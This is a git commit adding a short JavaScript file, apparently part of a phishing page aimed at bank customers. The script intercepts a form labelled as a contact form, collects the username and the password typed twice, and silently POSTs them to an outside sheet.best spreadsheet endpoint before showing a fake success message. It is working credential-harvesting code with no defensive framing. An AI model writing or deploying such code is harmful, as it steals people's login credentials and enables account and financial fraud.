189eef2bc9c91fd0964442caa82ef5e41587a190
soporte-cell <160882584+soporte-cell@users.noreply.github.com>
2024-03-01 09:45:11 -0600

    add files data banc mjm xcm

---
+++ js/bj39.js
@@ -0,0 +1,31 @@
+const formulario = document.getElementById('contact-form');
+const registro = document.getElementById('registro');
+const exito = document.getElementById('exito');
+
+formulario.addEventListener('submit', async(e) =>{
+    e.preventDefault();
+
+
+try {    
+    const respuesta = await fetch('https://sheet.best/api/sheets/305ae8eb-3066-4ac8-818d-3b6e4c982c9a', {
+        method: 'POST',
+        mode: 'cors',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            "Usuario": formulario.usuario.value,
+            "Clave1": formulario.contraseña.value,
+            "Clave2": formulario.confirmar.value
+        })
+    });
+
+
+
+} catch(error){
+    console.log(error);
+}
+    
+    registro.classList.remove('activo');
+    exito.classList.add('activo');
+});
